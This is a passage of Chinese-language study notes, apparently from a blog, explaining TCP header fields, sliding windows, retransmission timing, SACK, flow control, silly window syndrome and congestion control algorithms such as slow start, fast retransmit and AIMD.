用来释放一个连接。FIN=1 表明此报文段的发送端的数据已发送完毕，并要求释放运输连接。 </p><p><strong>窗口字段</strong> —— 占 2 字节，用来让对方设置发送窗口的依据，单位为字节。</p><p><strong>检验和</strong> —— 占 2 字节。检验和字段检验的范围包括首部和数据这两部分。在计算检验和时，要在 TCP 报文段的前面加上 12 字节的伪首部。</p><p>在计算检验和时，临时把 12 字节的“伪首部”和 TCP 报文段连接在一起。伪首部仅仅是为了计算检验和。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210406220316580.png" alt="image-20210406220316580"></p><p><strong>紧急指针字段</strong> —— 占 16 位，指出在本报文段中紧急数据共有多少个字节（紧急数据放在本报文段数据的最前面）。 </p><p><strong>选项字段</strong> —— 长度可变。TCP 最初只规定了一种选项，即最大报文段长度 MSS。MSS 告诉对方 TCP：“我的<strong>缓存所能接收的报文段的数据字段的最大长度是 MSS 个字节</strong>。” </p><ul><li><p>MSS (Maximum Segment Size)<br>是 TCP 报文段中的数据字段的最大长度。<br>数据字段加上 TCP 首部才等于整个的 TCP 报文段。<br>所以，MSS是“TCP 报文段长度减去 TCP 首部长度”。</p></li><li><p>为什么规定MSS</p><blockquote><p>MSS 与接收窗口值没有关系。</p><p>若选择较小的 MSS 长度，网络的利用率就降低。</p><p>若 TCP 报文段非常长，那么在 IP 层传输时就有可能要分解成多个短数据报片。在终点要把收到的各个短数据报片装配成原来的 TCP 报文段。当传输出错时还要进行重传。这些也都会使开销增大。</p><p>因此，MSS 应尽可能大些，只要在 IP 层传输时不需要再分片就行。</p><p>但最佳的 MSS 是很难确定的。</p></blockquote></li></ul><p><strong>其他选项</strong></p><ul><li><strong>窗口扩大选项</strong> ——占 3 字节，其中有一个字节表示移位值 S。新的窗口值等于 TCP 首部中的窗口位数增大到 (16 + S)，相当于把窗口值向左移动 S 位后获得实际的窗口大小。</li><li><strong>时间戳选项</strong>——占 10 字节，其中最主要的字段时间戳值字段（4 字节）和时间戳回送回答字段（4 字节）。</li><li><strong>选择确认选项</strong>——在后面的”TCP可靠传输的实现”介绍。 </li></ul><p><strong>填充字段</strong> —— 这是为了使整个首部长度是 4 字节的整数倍。 </p><h1 id="TCP可靠传输的实现"><a href="#TCP可靠传输的实现" class="headerlink" title="TCP可靠传输的实现"></a>TCP可靠传输的实现</h1><h2 id="以字节为单位的滑动窗口"><a href="#以字节为单位的滑动窗口" class="headerlink" title="以字节为单位的滑动窗口"></a>以字节为单位的滑动窗口</h2><p>前面讲了可靠传输原理中的流水线传输以及连续 ARQ协议以及后面实现的图示，这里通过回顾来补充和引入新知识点</p><ul><li>TCP 使用流水线传输和滑动窗口协议实现高效、可靠的传输。</li><li>TCP 的滑动窗口是以字节为单位的。</li><li>发送方 A 和接收方 B 分别维持一个发送窗口和一个接收窗口。</li><li>发送窗口表示：在没有收到确认的情况下，可以连续把窗口内的数据全部发送出去。</li><li>接收窗口表示：只允许接收落入窗口内的数据。</li></ul><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407150007573.png" alt="image-20210407150007573"></p><p>通过图，可以知道：</p><ul><li>首先，根据 B 给出的接收窗口值，A 构造出自己的发送窗口。但是不能大于B的窗口，否则可能超出B的接收范围</li><li>发送窗口表示：在没有收到 B 的确认的情况下，A 可以连续把窗口内的数据都发送出去。 </li><li>发送窗口里面的序号表示允许发送的序号。</li><li>显然，窗口越大，发送方就可以在收到对方确认之前连续发送更多的数据，因而可能获得更高的传输效率。但其实它还是会收到一些其它因素的影响，比如网络堵塞，后面会讲到</li></ul><p>图里讲到TCP标准强烈不建议发送窗口前沿向后收缩，这是为啥嘞，因为在你收缩的时候这些数据可能已经发送出去了，到时候等窗口移过去你又发送一遍，就会发生错误</p><p>现在假设A发送了11个字节的数据，但B这边出了点状况，有部分字节没有按序收到，可能是31出错了，导致32、33没有按序收到</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407150227334.png" alt="image-20210407150227334"></p><p>这时候B会怎么做，它会等待缺少的数据到来（这里要注意：如同前面讲的，发送方会未确认序号开始一次性把后面的数据发送来，尽管接收方已经接收到了后面的数据。且等新数据到来后接收方依旧会丢弃掉这些重复的数据）</p><p>而等到数据正确到来，接收方也准确无误把它们交付给上一层后，窗口就会丢掉这些值，并向前移动<img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407152428236.png" alt="image-20210407152428236"></p><p>而如果当A 的发送窗口内的序号都已用完，但还没有再收到确认，那么A就必须停止发送。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407151335623.png" alt="image-20210407151335623"></p><h3 id="发送缓存与接收缓存"><a href="#发送缓存与接收缓存" class="headerlink" title="发送缓存与接收缓存"></a>发送缓存与接收缓存</h3><p>发送方以及接收方的窗口都会包含缓存，用于存储临时数据</p><p>发送方的应用进程会把字节流写入 TCP 的发送缓存。直到接收方正确接收了，它就会把缓存删除。发送缓存存放的数据主要为两种</p><ol><li>暂存TCP准备发送的数据；</li><li>暂时存放TCP 已发送出但尚未收到确认的数据。</li></ol><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407152605336.png" alt="image-20210407152605336"></p><p>接收方的应用进程也会从 TCP 的接收缓存中读取字节流。</p><p>所以其会暂时存取两种数据</p><ol><li>按序到达的、但尚未被接收应用程序读取的数据；</li><li>不按序到达的数据</li></ol><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407152743085.png" alt="image-20210407152743085"></p><p>根据以上，我们需要强调以及知道以下三点</p><p>第一，A 的发送窗口并不总是和 B 的接收窗口一样大（因为有一定的时间滞后）。</p><p>第二，TCP 标准没有规定对不按序到达的数据应如何处理。通常是先临时存放在接收窗口中，等到字节流中所缺少的字节收到后，再按序交付上层的应用进程。</p><p>第三，TCP 要求接收方必须有累积确认的功能，这样可以减小传输开销。 </p><p>对于接收方：它可以在合适的时候发送确认，也可以在自己有数据要发送时把确认信息顺便捎带上。但请注意两点：</p><ol><li><p>接收方不应过分推迟发送确认，否则会导致发送方不必要的重传，这反而浪费了网络的资源。</p></li><li><p>捎带确认实际上并不经常发生，因为大多数应用程序很少同时在两个方向上发送数据。</p></li></ol><h2 id="超时重传时间的选择"><a href="#超时重传时间的选择" class="headerlink" title="超时重传时间的选择"></a>超时重传时间的选择</h2><p>重传时间的选择是 TCP 最复杂的问题之一。</p><p>如果把超时重传时间设置得太短，就会引起很多报文段的不必要的重传，使网络负荷增大。</p><p>但若把超时重传时间设置得过长，则又使网络的空闲时间增大，降低了传输效率。</p><p>因此TCP 采用了一种<strong>自适应算法</strong>，它记录一个报文段发出的时间，以及收到相应的确认的时间。这两个时间之差就是报文段的往返时间 RTT。</p><h3 id="加权平均往返时间"><a href="#加权平均往返时间" class="headerlink" title="加权平均往返时间"></a>加权平均往返时间</h3><ul><li>TCP保留了RTT的一个加权平均往返时间RTTS（这又称为平滑的往返时间）。</li><li>第一次测量到 RTT 样本时，RTTS 值就取为所测量到的 RTT 样本值。以后每测量到一个新的 RTT 样本，就按下式重新计算一次 RTTS：</li></ul><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407154611456.png" alt="image-20210407154611456"></p><p>式中，0 ＜= α ＜ 1。若 α 很接近于零，表示 RTT 值更新较慢。若选择 α 接近于 1，则表示 RTT 值更新较快。<br>RFC 6298 推荐的 α 值为 1/8，即 0.125。 </p><h3 id="超时重传时间-RTO"><a href="#超时重传时间-RTO" class="headerlink" title="超时重传时间 RTO"></a>超时重传时间 RTO</h3><p>RTO (Retransmission Time-Out) 应<strong>略大于</strong>上面得出的加权平均往返时间 RTTS。</p><p>RFC 6298 建议使用下式计算 RTO：</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407154857678.png" alt="image-20210407154857678"></p><p>RTTD 是 RTT 的偏差的加权平均值。<br>RFC 6298 建议这样计算RTTD 。第一次测量时， RTTD 值取为测量到的 RTT 样本值的一半。在以后的测量中，则使用下式计算加权平均的 RTTD ：</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407154926977.png" alt="image-20210407154926977"></p><p>β是个小于 1 的系数，其推荐值是 1/4，即 0.25。</p><h3 id="往返时间-RTT-的测量相当复杂"><a href="#往返时间-RTT-的测量相当复杂" class="headerlink" title="往返时间 (RTT) 的测量相当复杂"></a>往返时间 (RTT) 的测量相当复杂</h3><p>现在假设这样一种情况，TCP 报文段 1 没有收到确认。重传（即报文段 2）后，收到了确认报文段 ACK。<br>如何判定此确认报文段是对原来的报文段 1 的确认，还是对重传的报文段 2 的确认？ </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407155147444.png" alt="image-20210407155147444"></p><p>在计算平均往返时间 RTT 时，只要报文段重传了，就不采用其往返时间样本。<br>这样得出的加权平均平均往返时间 RTTS 和超时重传时间 RTO 就较准确。<br>但是，这又引起新的问题。当报文段的时延突然增大了很多时，在原来得出的重传时间内，不会收到确认报文段。于是就重传报文段。但根据 Karn 算法，不考虑重传的报文段的往返时间样本。这样，超时重传时间就无法更新。</p><h3 id="修正的-Karn-算法"><a href="#修正的-Karn-算法" class="headerlink" title="修正的 Karn 算法"></a>修正的 Karn 算法</h3><p>报文段每重传一次，就把 RTO 增大一些：</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407155238710.png" alt="image-20210407155238710"></p><p>系数 λ的典型值是 2 。<br>当不再发生报文段的重传时，才根据报文段的往返时延更新平均往返时延 RTT 和超时重传时间 RTO 的数值。<br>实践证明，这种策略较为合理。 </p><h2 id="选择确认-SACK"><a href="#选择确认-SACK" class="headerlink" title="选择确认 SACK"></a>选择确认 SACK</h2><p>前面我们知道，当接收方收到没有正确按序的数据时，发送方会将包括这部分数据也一起发送来，这看起来是不是极其耗费性能，那么我们能否设法只传送缺少的数据而不重传已经正确到达接收方的数据？</p><p>选择确认 SACK  (Selective ACK) 就是一种可行的处理方法</p><p>接收方可以将正确接收到的数据序号发送回发送方，使发送方不要再发送这些数据，这里要注意序号的问题。如图，你接受到了1—1000的数据那么确认号就要在右边界上再加1</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407155722884.png" alt="image-20210407155722884"></p><p>如果要使用选择确认，那么在建立 TCP 连接时，就要在 TCP 首部的选项中加上“允许 SACK”的选项，而双方必须都事先商定好。</p><p>如果使用选择确认，那么原来首部中的“确认号字段”的用法仍然不变。只是以后在 TCP 报文段的首部中都增加了 SACK 选项，以便报告收到的不连续的字节块的边界。</p><p>由于首部选项的长度最多只有 40 字节，而指明一个边界就要用掉 4 字节，因此在选项中最多只能指明 4 个字节块的边界信息。</p><p>最后，也是重要的一点</p><p><strong>因为SACK文档没有指明发送方应当怎样响应SACK，因此大多数的实现还是重传所有未被确认的数据块</strong></p><h1 id="TCP的流量控制"><a href="#TCP的流量控制" class="headerlink" title="TCP的流量控制"></a>TCP的流量控制</h1><h2 id="利用滑动窗口实现流量控制"><a href="#利用滑动窗口实现流量控制" class="headerlink" title="利用滑动窗口实现流量控制"></a>利用滑动窗口实现流量控制</h2><p>一般说来，我们总是希望数据传输得更快一些。但如果发送方把数据发送得过快，接收方就可能来不及接收，这就会造成数据的丢失。<br>流量控制 (flow control) 就是让发送方的发送速率不要太快，既要让接收方来得及接收，也不要使网络发生拥塞。<br>利用滑动窗口机制可以很方便地在 TCP 连接上实现流量控制。 </p><p>用一个图来表示这个过程</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407162855529.png" alt="image-20210407162855529"></p><p>这便是通过滑动窗口机制来来同台控制数据流量</p><p>但是，有这么一个情况，当B不允许A发送过后一段时间内，需要重新进行数据传输，但是巧了，这时候B的请求在路上丢失了，咋办，这个互不搭理（停止传输数据）的状态不就会这样一直保持下去吗</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407163156764.png" alt="image-20210407163156764"></p><p>这种互相等待的状态也成为<strong>死锁</strong>局面，如果没有其他措施，这种互相等待的死锁局面将一直延续下去。</p><p>而为了解决这个问题，TCP 为每一个连接设有一个持续计时器 (persistence timer)。</p><p>只要 TCP 连接的一方收到对方的零窗口通知，就启动该持续计时器。</p><p>若持续计时器设置的时间到期，就发送一个零窗口探测报文段（仅携带 1 字节的数据），而对方就在确认这个探测报文段时给出了现在的窗口值。</p><p>若窗口仍然是零，则收到这个报文段的一方就重新设置持续计时器。</p><p>若窗口不是零，则死锁的僵局就可以打破了。 皆大欢喜</p><h2 id="TCP-的传输效率"><a href="#TCP-的传输效率" class="headerlink" title="TCP 的传输效率"></a>TCP 的传输效率</h2><p>前面有提到：当应用程序把数据传送到TCP的发送缓冲后，剩下的发送任务就由TCP控制了，可以用不同的机制来控制 TCP 报文段的发送时机</p><ol><li>第一种机制是 TCP 维持一个变量，它等于最大报文段长度 MSS。只要缓存中存放的数据达到 MSS 字节时，就组装成一个 TCP 报文段发送出去。</li><li>第二种机制是由发送方的应用进程指明要求发送报文段，即 TCP 支持的推送 (push) 操作。</li><li>第三种机制是发送方的一个计时器期限到了，这时就把当前已有的缓存数据装入报文段（但长度不能超过 MSS）发送出去。</li></ol><p>如何控制 TCP 发送报文段的时机仍然是一个较为复杂的问题。</p><h3 id="糊涂窗口综合症"><a href="#糊涂窗口综合症" class="headerlink" title="糊涂窗口综合症"></a>糊涂窗口综合症</h3><p>在了解怎么合理控制发送时机前，我们首先来了解一个概念：糊涂窗口综合症</p><blockquote><p>糊涂窗口综合症：每次仅发送一个字节或很少几个字节的数据时，有效数据传输效率变得很低的现象。</p></blockquote><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407164102037.png" alt="image-20210407164102037"></p><h3 id="发送方糊涂窗口综合症"><a href="#发送方糊涂窗口综合症" class="headerlink" title="发送方糊涂窗口综合症"></a>发送方糊涂窗口综合症</h3><p><strong>现象：</strong>发送方 TCP 每次接收到一字节的数据后就发送。<br>这样，发送一个字节需要形成 41 字节长的 IP 数据报。效率很低。</p><p><strong>解决方法：</strong>使用 Nagle 算法。</p><p>若发送应用进程把要发送的数据逐个字节地送到 TCP 的发送缓存，则发送方就把第一个数据字节先发送出去，把后面到达的数据字节都缓存起来。<br>当发送方收到对第一个数据字符的确认后，再把发送缓存中的所有数据组装成一个报文段发送出去，同时继续对随后到达的数据进行缓存。<br>只有在收到对前一个报文段的确认后才继续发送下一个报文段。<br>当到达的数据已达到发送窗口大小的一半或已达到报文段的最大长度时，就立即发送一个报文段。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407164246900.png" alt="image-20210407164246900"></p><h3 id="接收方糊涂窗口综合症"><a href="#接收方糊涂窗口综合症" class="headerlink" title="接收方糊涂窗口综合症"></a>接收方糊涂窗口综合症</h3><p>这个的现象主要如下</p><p>当接收方的 TCP 缓冲区已满，接收方会向发送方发送窗口大小为 0 的报文。<br>若此时接收方的应用进程以交互方式每次只读取一个字节，于是接收方又发送窗口大小为一个字节的更新报文，发送方应邀发送一个字节的数据（发送的 IP 数据报是 41 字节长），于是接收窗口又满了，如此循环往复。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407164353139.png" alt="image-20210407164353139"></p><p><strong>原因：</strong>接收方应用进程消耗数据太慢，例如：每次只读取一个字节。</p><p><strong>解决方法：</strong>让接收方等待一段时间，使得或者接收缓存已有足够空间容纳一个最长的报文段，或者等到接收缓存已有一半空闲的空间。只要出现这两种情况之一，接收方就发出确认报文，并向发送方通知当前的窗口大小。</p><h1 id="TCP的拥塞控制"><a href="#TCP的拥塞控制" class="headerlink" title="TCP的拥塞控制"></a>TCP的拥塞控制</h1><h2 id="拥塞控制的一般原理"><a href="#拥塞控制的一般原理" class="headerlink" title="拥塞控制的一般原理"></a>拥塞控制的一般原理</h2><p>首先：看看拥塞的现象</p><p>在某段时间，若对网络中<strong>某资源的需求超过了该资源所能提供的可用部分</strong>(信道不够用)，网络的性能就要变坏。这种现象称为拥塞 (congestion)。<br>最坏结果：系统崩溃。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407165856238.png" alt="image-20210407165856238"></p><p>出现<strong>拥塞</strong>的原因，可能如下</p><ol><li>点缓存的容量太小；</li><li>链路的容量不足；</li><li>处理机处理的速率太慢；</li><li>拥塞本身会进一步加剧拥塞；</li></ol><p>总的来说便是 </p><p><strong>∑ 对资源需求  &gt; 可用资源</strong></p><p>那么，通过增加资源能解决拥塞吗？</p><p>不能。这是因为网络拥塞是一个非常复杂的问题。简单地采用上述做法，在许多情况下，不但不能解决拥塞问题，而且还可能使网络的性能更坏。</p><p>网络拥塞往往是由许多因素引起的。例如：<br>增大缓存，但未提高输出链路的容量和处理机的速度，排队等待时间将会大大增加，引起大量超时重传，解决不了网络拥塞；<br>提高处理机处理的速率会会将瓶颈转移到其他地方；</p><p>这时候我们就要用到拥塞控制去降低网络拥塞带来的影响</p><h3 id="拥塞控制和流量控制"><a href="#拥塞控制和流量控制" class="headerlink" title="拥塞控制和流量控制"></a>拥塞控制和流量控制</h3><p>首先，我们来区别拥塞控制和流量控制</p><p>拥塞控制与流量控制的关系密切，它们之间也存在一些差别</p><blockquote><p>拥塞控制：</p><p>防止过多的数据注入到网络中，使网络中的路由器或链路不致过载；</p><p>是一个全局性的过程，涉及到与降低网络传输性能有关的所有因素。</p></blockquote><blockquote><p>流量控制：</p><p>抑制发送端发送数据的速率，以使接收端来得及接收；</p><p>是点对点通信量的控制，是端到端的问题；</p></blockquote><h3 id="拥塞控制的一般原理-1"><a href="#拥塞控制的一般原理-1" class="headerlink" title="拥塞控制的一般原理"></a>拥塞控制的一般原理</h3><p>拥塞控制的前提：网络能够承受现有的网络负荷。<br>实践证明，拥塞控制是很难设计的，因为它是一个动态问题。<br>分组的丢失是网络发生拥塞的征兆而不是原因。<br>在许多情况下，甚至正是拥塞控制本身成为引起网络性能恶化、甚至发生死锁的原因。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407170728128.png" alt="image-20210407170728128"></p><h3 id="开环控制和闭环控制"><a href="#开环控制和闭环控制" class="headerlink" title="开环控制和闭环控制"></a>开环控制和闭环控制</h3><p>在面对设计网络时，我们通常采用开环控制方法和闭环控制方法，通俗来讲就是，前者就是尽量不让问题发生，后者是在问题发生时及时控制</p><blockquote><p><strong>开环控制</strong></p><p>在设计网络时，事先考虑周全，力求工作时不发生拥塞；</p><p><strong>思路：</strong>力争避免发生拥塞。</p></blockquote><blockquote><p><strong>闭环控制</strong></p><p>基于反馈环路的概念；</p><p>根据网络当前的运行状态采取相应控制措施；</p><p><strong>思路：</strong>在发生拥塞后，采取措施进行控制，消除拥塞。</p></blockquote><p>属于闭环控制的有以下几种措施：<br>(1) 监测网络系统，以便检测到拥塞在何时、何处发生。<br>(2) 将拥塞发生的信息传送到可采取行动的地方。<br>(3) 调整网络系统的运行以解决出现的问题。</p><p><strong>那么如何检测网络拥塞嘞</strong>，主要指标有：</p><ol><li>由于缺少缓存空间而被丢弃的分组的百分数；</li><li>平均队列长度；</li><li>超时重传的分组数；</li><li>平均分组时延；</li><li>分组时延的标准差，等等。</li></ol><p>上述这些指标的上升都标志着拥塞的增长。</p><p><strong>那么怎么去知道拥塞发生了呢</strong></p><ol><li>发送通知拥塞发生的分组；</li><li>在分组中保留表示拥塞状态的字段；</li><li>周期性地发出探测分组等。</li></ol><p><strong>那么这个时机该如何把握嘞</strong></p><p>过于频繁，会使系统产生不稳定的振荡；<br>过于迟缓地采取行动又不具有任何实用价值。</p><p><strong>解决拥塞的两条思路</strong></p><p>增加网络可用资源；<br>减少用户对资源的需求。</p><h2 id="TCP-的拥塞控制方法"><a href="#TCP-的拥塞控制方法" class="headerlink" title="TCP 的拥塞控制方法"></a>TCP 的拥塞控制方法</h2><p>TCP 采用基于窗口的方法进行拥塞控制。该方法属于闭环控制方法。</p><p>TCP发送方维持一个拥塞窗口 cwnd (Congestion Window)<br>发送端利用拥塞窗口根据网络的拥塞情况调整发送的数据量。</p><p>发送窗口大小不仅取决于接收方窗口，还取决于网络的拥塞状况，所以真正的发送窗口值为：</p><blockquote><p>真正的发送窗口值 = Min (接收方窗口值，拥塞窗口值)</p></blockquote><h3 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h3><p>只要网络没有出现拥塞，拥塞窗口就可以再增大一些，以便把更多的分组发送出去，这样就可以提高网络的利用率。</p><p>但只要网络出现拥塞或有可能出现拥塞，就必须把拥塞窗口减小一些，以减少注入到网络中的分组数，以便缓解网络出现的拥塞。</p><h3 id="判断拥塞"><a href="#判断拥塞" class="headerlink" title="判断拥塞"></a>判断拥塞</h3><p>重传定时器超时：网络已经发生了拥塞。</p><p>收到三个重复的 ACK：预示网络可能会出现拥塞（实际可能还未发生拥塞）。</p><h3 id="TCP拥塞控制算法"><a href="#TCP拥塞控制算法" class="headerlink" title="TCP拥塞控制算法"></a>TCP拥塞控制算法</h3><h4 id="慢开始-slow-start"><a href="#慢开始-slow-start" class="headerlink" title="慢开始 (slow-start)"></a>慢开始 (slow-start)</h4><p><strong>目的：</strong>用来确定网络的负载能力或拥塞程度。</p><p><strong>算法的思路：</strong>由小到大逐渐增大拥塞窗口数值。</p><p><strong>两个变量：</strong></p><blockquote><p>拥塞窗口：</p><p>初始拥塞窗口值：2 种设置方法。<br>    1 至 2 个最大报文段 （旧标准）<br>    2 至 4 个最大报文段 （RFC 5681）</p><p>窗口值逐渐增大。</p></blockquote><blockquote><p>慢开始门限：</p><p>防止拥塞窗口增长过大引起网络拥塞。</p></blockquote><p>拥塞窗口 cwnd  控制方法：在每收到一个对新的报文段的确认后，可以把拥塞窗口增加最多一个 SMSS 的数值。</p><blockquote><p>拥塞窗口 cwnd 每次的增加量 = min (N, SMSS)     </p></blockquote><p>其中 N 是原先未被确认的、但现在被刚收到的确认报文段所确认的字节数。<br>不难看出，当 N &lt; SMSS 时，拥塞窗口每次的增加量要小于 SMSS。<br>用这样的方法逐步增大发送方的拥塞窗口 cwnd，可以使分组注入到网络的速率更加合理。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407172825021.png" alt="image-20210407172825021"></p><p>发送方每收到一个对新报文段的确认（重传的不算在内）就使 cwnd 加 1。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407172914039.png" alt="image-20210407172914039"></p><p>每经过一个传输轮次，拥塞窗口就加倍。</p><p>使用慢开始算法后，每经过一个传输轮次 (transmission round)，拥塞窗口 cwnd 就加倍。 </p><p>一个传输轮次所经历的时间其实就是往返时间 RTT。</p><p>“传输轮次”更加强调：把拥塞窗口 cwnd 所允许发送的报文段都连续发送出去，并收到了对已发送的最后一个字节的确认。</p><p>例如，拥塞窗口 cwnd = 4，这时的往返时间 RTT 就是发送方连续发送 4 个报文段，并收到这 4 个报文段的确认，总共经历的时间。 </p><p><strong>慢开始门限 ssthresh 的用法如下：</strong></p><p>当 cwnd &lt; ssthresh 时，使用慢开始算法。<br>当 cwnd &gt; ssthresh 时，停止使用慢开始算法而改用拥塞避免算法。<br>当 cwnd = ssthresh 时，既可使用慢开始算法，也可使用拥塞避免算法。</p><h4 id="拥塞避免-congestion-avoidance"><a href="#拥塞避免-congestion-avoidance" class="headerlink" title="拥塞避免 (congestion avoidance)"></a>拥塞避免 (congestion avoidance)</h4><p><strong>思路：</strong>让拥塞窗口 cwnd 缓慢地增大，避免出现拥塞。</p><p>每经过一个传输轮次，拥塞窗口 cwnd = cwnd + 1。</p><p>使拥塞窗口 cwnd 按线性规律缓慢增长。</p><p>在拥塞避免阶段，具有 “加法增大” (Additive Increase) 的特点。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407172914039.png" alt="image-20210407172914039"></p><p>在超时之前，每经过一个传输轮次就使 cwnd 加 1。 </p><p><strong>当网络出现拥塞时</strong></p><p>无论在慢开始阶段还是在拥塞避免阶段，只要发送方判断网络出现拥塞（重传定时器超时）：<br>ssthresh = max (cwnd/2，2)<br>cwnd = 1<br>执行慢开始算法<br>目的：迅速减少主机发送到网络中的分组数，使得发生拥塞的路由器有足够时间把队列中积压的分组处理完毕。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407173243947.png" alt="image-20210407173243947"></p><p>当 TCP 连接进行初始化时，将拥塞窗口置为 1。图中的窗口单位不使用字节而使用报文段。</p><p>慢开始门限的初始值设置为 16 个报文段，即 ssthresh = 16。</p><p>慢开始和拥塞避免算法的实现GIF图举例</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6.gif" alt="拥塞控制"></p><p><strong>必须强调指出</strong></p><p>“拥塞避免”<strong>并非指完全能够避免了拥塞</strong>。利用以上的措施要完全避免网络拥塞还是不可能的。</p><p>“拥塞避免”是说在拥塞避免阶段把拥塞窗口控制为按线性规律增长，使网络比较不容易出现拥塞。 </p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407173752095.png" alt="image-20210407173752095"></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407173815321.png" alt="image-20210407173815321"></p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407173824284.png" alt="image-20210407173824284"></p><h4 id="快重传-fast-retransmit"><a href="#快重传-fast-retransmit" class="headerlink" title="快重传 (fast retransmit)"></a>快重传 (fast retransmit)</h4><p>发送方只要一连收到三个重复确认，就知道接收方确实没有收到报文段，因而应当立即进行重传（即“快重传”），这样就不会出现超时，发送方也不就会误认为出现了网络拥塞。</p><p>使用快重传可以使整个网络的吞吐量提高约20%。 </p><blockquote><p>不难看出，快重传并非取消重传计时器，而是在某些情况下可以更早地（更快地）重传丢失的报文段。 </p></blockquote><p>采用快重传 FR (Fast Retransmission) 算法可以让发送方尽早知道发生了个别报文段的丢失。</p><p>快重传 算法<strong>首先要求接收方不要等待自己发送数据时才进行捎带确认，而是要立即发送确认，即使收到了失序的报文段也要立即发出对已收到的报文段的重复确认</strong>。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407173936005.png" alt="image-20210407173936005"></p><h4 id="快恢复-fast-recovery"><a href="#快恢复-fast-recovery" class="headerlink" title="快恢复 (fast recovery)"></a>快恢复 (fast recovery)</h4><p>当发送端收到连续三个重复的确认时，由于发送方现在认为网络很可能没有发生拥塞，因此现在不执行慢开始算法，而是执行快恢复算法 FR (Fast Recovery) 算法：</p><ol><li>慢开始门限 ssthresh = 当前拥塞窗口 cwnd / 2 ；</li><li>新拥塞窗口 cwnd = 慢开始门限 ssthresh ；</li><li>开始执行拥塞避免算法，使拥塞窗口缓慢地线性增大。 </li></ol><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407174035629.png" alt="image-20210407174035629"></p><p>因此，在图的点4，发送方知道现在只是丢失了个别的报文段。于是不启动慢开始，而是执行快恢复算法。这时，发送方调整门限值 ssthresh = cwnd / 2 = 8，同时设置拥塞窗口 cwnd = ssthresh = 8（见图中的点5），并开始执行拥塞避免算法。</p><h3 id="加法增大，乘法减小-AIMD"><a href="#加法增大，乘法减小-AIMD" class="headerlink" title="加法增大，乘法减小 (AIMD)"></a>加法增大，乘法减小 (AIMD)</h3><p>可以看出，在拥塞避免阶段，拥塞窗口是按照线性规律增大的。这常称为“加法增大” AI (Additive Increase)。</p><p>当出现超时或3个重复的确认时，就要把门限值设置为当前拥塞窗口值的一半，并大大减小拥塞窗口的数值。这常称为“乘法减小”MD (Multiplicative Decrease)。</p><p>二者合在一起就是所谓的 AIMD 算法。</p><p><img src= "/img/loading.gif" data-src="/2021/04/18/%E8%BF%90%E8%BE%93%E5%B1%82/image-20210407174136186.png" alt="image-20210407174136186"></p><p>发送方的发送窗口的上限值应当取为接收方窗口 rwnd 和拥塞窗口 cwnd 这两个变量中较小的一个，即应按以下公式确定：</p><blockquote><p>发送窗口的上限值 = Min [rwnd, cwnd]</p></blockquote><p>当 rwnd &lt; cwnd 时，是接收方的接收能力限制发送窗口的最大值。</p><p>当 cwnd &lt; rwnd 时，则是网络的拥塞限制发送窗口的最大值。 </p><p>也就是说，rwnd 和 cwnd 中数值较小的一个，控制了发送方发送数据的速率。</p><h2 id="主动队列管理-AQM"><a href="#主动队列管理-AQM" class="headerlink" title="主动队列管理 AQM"></a>主动队列管理 AQM</h2><p>TCP 